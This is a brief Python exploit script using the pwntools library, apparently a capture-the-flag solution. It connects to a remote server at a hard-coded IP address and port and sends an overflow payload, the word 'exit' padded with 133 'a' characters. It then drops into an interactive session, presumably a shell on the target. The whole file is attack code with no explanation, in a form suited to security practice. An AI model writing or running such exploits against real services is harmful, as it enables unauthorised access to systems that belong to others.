#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11005

yuan = remote(host,port)

p = 'exit'+'a'*133
yuan.send(p)
yuan.interactive()
